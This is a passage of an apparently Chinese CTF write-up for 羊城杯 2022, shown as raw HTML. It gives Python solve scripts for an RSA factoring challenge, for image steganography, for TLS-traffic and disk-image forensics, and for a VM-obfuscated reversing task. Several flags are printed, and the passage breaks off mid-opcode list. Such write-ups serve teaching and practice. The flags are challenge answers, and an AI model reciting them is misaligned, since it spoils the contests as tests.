class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>使用LLL算法得到(p-58,q-44,k)，即可分解n。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">B=<span class="number">1023</span></span><br><span class="line">PPQ=<span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ=<span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t=<span class="number">44</span></span><br><span class="line">c=<span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">PQ = gmpy2.gcd(PPQ,PQQ)</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">p = <span class="number">80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137205</span>+<span class="number">58</span></span><br><span class="line">q = <span class="number">71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586407</span>+<span class="number">44</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,p*q)))</span><br></pre></td></tr></table></figure>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h3>
<p>直接ciphey识别解码就OK</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/14.png" alt="14"></p>
<h3 id="where_is_secret"><a class="markdownIt-Anchor" href="#where_is_secret"></a> where_is_secret</h3>
<p>拿到附件，vig.txt的内容一眼丁真，vigenere编码（<a href="https://www.guballa.de/vigenere-solver%EF%BC%89%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%EF%BC%8C%E6%8B%BF%E5%88%B0%E8%A7%A3%E5%BC%80%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%BE%97%E5%88%B0%E4%B8%80%E5%BC%A0bmp%E5%9B%BE%E7%89%87%EF%BC%8C%E7%BB%93%E5%90%88hint%E7%9A%84%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%86%99%E8%AF%BB%E5%83%8F%E7%B4%A0%E7%82%B9%E8%84%9A%E6%9C%AC">https://www.guballa.de/vigenere-solver）在线解密，拿到解开压缩包得到一张bmp图片，结合hint的脚本，写读像素点脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">text</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(text)</span><br><span class="line">    width = math.ceil(str_len ** <span class="number">0.5</span>)</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, width), <span class="number">0x0</span>)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        index = <span class="built_in">ord</span>(i)</span><br><span class="line">        rgb = (<span class="number">0</span>, (index &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>, index &amp; <span class="number">0xFF</span>)</span><br><span class="line">        im.putpixel((x, y), rgb)</span><br><span class="line">        <span class="keyword">if</span> x == width - <span class="number">1</span>:</span><br><span class="line">            x = <span class="number">0</span></span><br><span class="line">            y += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> im</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;829962.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&quot;out.bmp&quot;</span>)</span><br><span class="line">    imgdata = np.array(img)</span><br><span class="line">    index = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">371</span>):</span><br><span class="line">            m = <span class="built_in">int</span>(imgdata[x][y][<span class="number">1</span>])</span><br><span class="line">            n = <span class="built_in">int</span>(imgdata[x][y][<span class="number">2</span>])</span><br><span class="line">            <span class="built_in">str</span> = m&lt;&lt;<span class="number">8</span></span><br><span class="line">            <span class="built_in">str</span> += n</span><br><span class="line">            file.write(<span class="built_in">chr</span>(<span class="built_in">str</span>))</span><br><span class="line">    file.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    decode()</span><br></pre></td></tr></table></figure>
<p>打开输出的文本，发现flag被打散在文本中，写一个字母识别脚本,懒了，没写正则。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=<span class="string">&#x27;D:\\桌面\\829962.txt&#x27;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;3&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">var = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        var += i</span><br><span class="line"><span class="built_in">print</span>(var)</span><br></pre></td></tr></table></figure>
<p>获得串flag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/15.png" alt="15"></p>
<p>结合特征</p>
<p>flag{h1d3_1n_th3_p1ctur3}</p>
<h3 id="迷失幻境"><a class="markdownIt-Anchor" href="#迷失幻境"></a> 迷失幻境</h3>
<p>打卡压缩包，是虚拟磁盘镜像，取证大师挂载，查看回收站有一个jpg和一个45文件。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/16.png" alt="16"></p>
<p>查看45文件发现PNG格式特征</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/17.png" alt="17"></p>
<p>补充文件头，然后与给的100张图片中随便选一张用stegslove里的Image combiner，获得一窜字符“Key is 可莉前来报到”，猜测可爱可莉.jpg就是加密的图片，轮番试过之后，用outguess解出flag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/18.png" alt="18"></p>
<p>DASCTF{f473a6fd2de17a0c5794414b3905ebbe}</p>
<h3 id="躲猫猫"><a class="markdownIt-Anchor" href="#躲猫猫"></a> 躲猫猫</h3>
<p>打开题目附件，用wireshark打开，读取http报文，发现一个PNG特征格式的文件</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/19.png" alt="img"></p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/20.png" alt="img"></p>
<p>下载获得一张灰色的PNG</p>
<p>接着读报文，FTP拿到一个加密压缩包，发现key.log没有加密，查看内容，通过查询是用来解密TLS流量的。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/21.png" alt="img"></p>
<p>解密TLS流量之后获得一张JPG图片</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/22.png" alt="img"></p>
<p>内容是压缩包的解压密码。解压后的脚本是对原图的像素重计算，编写脚本恢复原图。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">image = cv2.imread(<span class="string">&quot;hide.png&quot;</span>)</span><br><span class="line">imagearray = array(image)</span><br><span class="line"> </span><br><span class="line">x,y = <span class="number">5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span>,<span class="number">6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span></span><br><span class="line"> </span><br><span class="line">h,w = <span class="number">1800</span>,<span class="number">1800</span></span><br><span class="line"> </span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1*<span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2*<span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3*<span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (imagearray[i][j][t] - ((r1+r2) ^ r3)) % <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到一张图片，一番搜索，是Maxicode码，扫描多次未成功，接着查找资料，发现猫的位置需要更替为一个中心靶标（公牛眼）</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/23.png" alt="img"></p>
<p>扫描成功！！</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/24.png" alt="img"></p>
<p>GWHT{ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3}</p>
<h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2>
<h3 id="bbbbutton"><a class="markdownIt-Anchor" href="#bbbbutton"></a> BBBButton</h3>
<p>输入分为两段，其中第二段是最后的flag。因为只有4个按钮，猜测与四进制有关，之后在动调的过程中也刚好发现了四进制转换后的数字。</p>
<h4 id="check1"><a class="markdownIt-Anchor" href="#check1"></a> <strong>check1</strong></h4>
<p>动调发现，check1是从一张表中得到&quot;-bl^H&quot;字符串，本质上是通过整除及取余的方式确定下标得到字符。脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> table <span class="keyword">import</span> table        <span class="comment"># 导入表</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x2d</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x5e</span>,<span class="number">0x48</span>]</span><br><span class="line">a1 = [<span class="number">0x2d</span>,<span class="number">0x62</span>]    <span class="comment"># 14772//4</span></span><br><span class="line">a2 = [<span class="number">0x6c</span>,<span class="number">0x5e</span>]    <span class="comment"># 24740//4</span></span><br><span class="line">a3 = <span class="number">0x48</span></span><br><span class="line"><span class="comment"># 4,344,684,1024,1364,1704,2044,2384,2724,3064,3404,3744,4084,4424,4764,5104,5444,5784,6124,6464,6804,7144,7484,7824,8164,8504,8844,9184,9524,9864,10204,10544,10884,11224,11564,11904,12244,12584,12924,13264,13604,13944,14284,14624,14964,15304,15644,15984,16324,16664,17004,17344,17684,18024,18364,18704,19044,19384,19724,20064,20404,20744,21084,21424,21764,22104,22444,22784,23124,23464,23804,24144,24484,24824,25164,25504,25844,26184,26524,26864,27204,27544,27884,28224,28564</span></span><br><span class="line">tt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(table),<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> table[i]==a3:</span><br><span class="line">        tt.append(i//<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># print(i,end=&#x27;,&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a1[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a1[<span class="number">1</span>]:</span><br><span class="line">        n = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;1:&#x27;,i)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a2[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a2[<span class="number">1</span>]:</span><br><span class="line">        m = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;2:&#x27;,i)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = n*<span class="number">0x1c39</span>+m</span><br><span class="line"><span class="comment"># k = 0x1973a6e</span></span><br><span class="line"><span class="comment"># print(hex(k))</span></span><br><span class="line"></span><br><span class="line">m = k%<span class="number">0x1c39</span></span><br><span class="line">b = k//<span class="number">0x1c39</span></span><br><span class="line"><span class="comment"># print(hex(m))</span></span><br><span class="line"><span class="comment"># print(hex(table[4*m]),hex(table[4*m+1]),hex(table[4*m+2]),hex(table[4*m+3]))</span></span><br><span class="line"><span class="comment"># print(chr(table[4*m+1]),chr(table[4*m]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tt:</span><br><span class="line">    a = i+<span class="number">85</span>*k</span><br><span class="line">    <span class="comment"># b,c = aaa(a,0x55)</span></span><br><span class="line">    c = a//<span class="number">0x55</span></span><br><span class="line">    <span class="keyword">if</span> c==k:</span><br><span class="line">        flag1 = a</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="comment"># 0x87366687</span></span><br></pre></td></tr></table></figure>
<p>将解出的a转化为4进制输入即可（动调按按钮真的魔鬼，不小心按错还得重头再来）</p>
<h4 id="check2"><a class="markdownIt-Anchor" href="#check2"></a> <strong>check2</strong></h4>
<p>vm混淆，opcode利用check1加密过，动调直接dump即可。然后就是喜闻乐见的手撕环节（悲</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = [<span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x7C</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span 